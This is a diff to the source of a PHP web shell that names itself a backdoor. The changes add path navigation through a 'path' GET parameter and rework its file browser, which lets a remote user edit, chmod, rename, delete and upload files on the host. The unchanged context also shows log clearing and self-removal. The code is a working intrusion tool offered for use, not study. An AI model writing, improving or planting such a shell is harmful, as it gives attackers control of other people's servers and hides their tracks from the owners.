@@ -150,6 +150,9 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
             -moz-border-right-colors: none;
             -moz-border-top-colors: none;
 		}
+		a {
+			color:#000;
+		}
 	</style>
 </head>
 <body>
@@ -234,13 +237,33 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 </table>
 <table class="table" align="center">
 <?php
+function cwd() {
+  if (isset($_GET['path'])) {
+    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
+    @chdir($cwd);
+  } else {
+    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
+  } return $cwd;
+}
+function pwd() {
+  $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
+  foreach ($dir as $key => $pwd) {
+    print("<a href='?path=");
+    for ($i=0; $i <= $key ; $i++) { 
+      print($dir[$i]);
+      if ($i != $key) {
+        print(DIRECTORY_SEPARATOR);
+      }
+    } print("'>".$pwd."</a>/");
+  }
+}
 function makefile($filename, $text) {
-  $fp = @fopen(@getcwd().$sep.$filename, "w");
+  $fp = @fopen(@cwd().DIRECTORY_SEPARATOR.$filename, "w");
   @fwrite($fp, $text);
   @fclose($fp);
 }
 function makedir($filename) {
-  return @mkdir(@getcwd().$sep.$filename);
+  return @mkdir(@cwd().$sep.$filename);
 }
 function perms($file) {
 $perms = fileperms($file);
@@ -293,12 +316,12 @@ $info .= (($perms & 0x0001) ?
 
 echo $info;
 }
-function writable($dir, $perms) {
-	if(!is_writable($dir)) {
-		return "<font color=red>".$perms."</font>";
-	} else {
-		return "<font color=green>".$perms."</font>";
-	}
+function permission($filename, $perms) {
+  if (is_writable($filename)) {
+    ?> <font color="green"><?php print $perms ?></font> <?php
+  } else {
+    ?> <font color="red"><?php print $perms ?></font> <?php
+  }
 }
 // FUNCTION
 function post_data($url, $data)
@@ -940,7 +963,7 @@ function renames($filename)
 		</tr>
 		<tr>
 			<td>
-				<input type='text' class='form-control' id='input' value='<?php echo $filename; ?>' name='newname'>
+				<input type='text' class='form-control' id='input' value='<?php echo @basename($filename); ?>' name='newname'>
 			</td>
 		</tr>
 		<tr>
@@ -1329,7 +1352,7 @@ function network()
 function kill()
 {
 	clear_logs();
-	unlink(getcwd() . $sep .$_SERVER['PHP_SELF']) ? alert("Backdoor removed") : alert("Permission Denied");
+	unlink(@cwd() . $sep .$_SERVER['PHP_SELF']) ? alert("Backdoor removed") : alert("Permission Denied");
 }
 // END FUNCTION
 
@@ -1361,10 +1384,6 @@ function kill()
 //		</ul>
 //	</div>
 //</nav>';
-
-if (isset($_GET['url'])) {
-	@chdir($_GET['url']);
-}
 	if ($_GET['do'] == 'home') {
 		home();
 	}
@@ -1445,22 +1464,29 @@ if (isset($_GET['url'])) {
 	<th>Action</th>
 </tr>
 </thead>
+<tr>
+	<td colspan="4">
+		<center>
+			<?php print @pwd() ?> ( <?php @permission(@cwd(), @perms(@cwd())) ?> )
+		</center>
+	</td>
+</tr>
 	<?php
-foreach (scandir(getcwd()) as $dir) {
+foreach (scandir(@cwd()) as $dir) {
 	if(!is_dir($dir)) continue;
 	if ($dir === '.' || $dir === '..') continue;
 		$tools = "<center>
-		<a class='btn btn-success btn-xs' href='?do=chmod&url=" .base64_encode(getcwd())."&files=".$dir."'>Chmod</a>
-		<a class='btn btn-success btn-xs' href='?do=rename&url=" .base64_encode(getcwd())."&files=".$dir."'>Rename</a> 
-		<a class='btn btn-success btn-xs' href='?do=delete&url=" .base64_encode(getcwd())."&files=".$dir."'>Delete</a></td>";
+		<a class='btn btn-success btn-sm' href='?path=".@cwd()."&do=chmod&files=".$dir."'>Chmod</a>
+		<a class='btn btn-success btn-sm' href='?path=".@cwd()."&do=rename&files=".$dir."'>Rename</a> 
+		<a class='btn btn-success btn-sm' href='?path=".@cwd()."&do=delete&files=".$dir."'>Delete</a></td>";
 		echo "<tr><td><img src='https://cvar1984.github.io/Blank-Folder-icon.png' class='icon'> ";
-		echo " <a href='?url=".@getcwd().$sep.$dir."'>".$dir."</a></td>";
+		echo " <a href='?path=".@cwd().DIRECTORY_SEPARATOR.$dir."'>".$dir."</a></td>";
 		echo "<td><center>--</center></td>";
 		echo "<td><center>";
-		echo "".@writable($dir, @perms($dir))."</center></td>";
+		echo "".@permission($dir, @perms($dir))."</center></td>";
 		echo "<td>".$tools."</td>";
 	}
-	foreach (@scandir(@getcwd()) as $file) {
+	foreach (@scandir(@cwd()) as $file) {
 		if(!is_file($file)) continue;
 		echo "<tr><td>";
 		print("<img src='");
@@ -1515,19 +1541,14 @@ foreach (scandir(getcwd()) as $dir) {
   } else {
     echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
   } print("' class='icon'></img>");
-  if (strlen($file) > 25){
-    $_file = substr($file, 0, 25)."...-.".$ext;                       
-  } else {
-    $_file = $file;          
-  }
-		echo " <a href='?do=edit&url=".base64_encode(getcwd())."&files=".$file."'>$file</a></td>";
+		echo " <a href='?path=".@cwd()."&do=edit&files=".@cwd().DIRECTORY_SEPARATOR.$file."'>".$file."</a></td>";
 		echo "<td><center>".@size($file)."</center></td>";
 		echo "<td><center>";
-		echo "".@writable($file, @perms($file))."</center></td>";
+		echo "".@permission($file, @perms($file))."</center></td>";
 		echo "<td><center>
-		<a class='btn btn-success btn-xs' href='?do=chmod&url=".base64_encode(getcwd())."&files=".$file."'>Chmod</a>
-		<a class='btn btn-success btn-xs' href='?do=rename&files=".base64_encode(getcwd() . $sep . $file)."'>Rename</a> 
-		<a class='btn btn-success btn-xs' href='?do=delete&files=".base64_encode(getcwd() . $sep . $file)."'>Delete</td>";
+		<a class='btn btn-success btn-sm' href='?path=".@cwd()."&do=chmod&files=".@cwd().DIRECTORY_SEPARATOR.$file."'>Chmod</a>
+		<a class='btn btn-success btn-sm' href='?path=".@cwd()."&do=rename&files=".@cwd().DIRECTORY_SEPARATOR.$file."'>Rename</a> 
+		<a class='btn btn-success btn-sm' href='?path=".@cwd()."&do=delete&files=".@cwd() . DIRECTORY_SEPARATOR . $file."'>Delete</td>";
 	}
 ?>
 	</tr>
@@ -1543,7 +1564,7 @@ foreach (scandir(getcwd()) as $dir) {
 </thead>
 	<?php
 if (isset($_POST['upl'])) {
-	if (copy($_FILES['file']['tmp_name'], getcwd() . $sep . $_FILES['file']['name'])) {
+	if (copy($_FILES['file']['tmp_name'], @cwd() . $sep . $_FILES['file']['name'])) {
 		alert("Upload Success");
 	}
 	else {
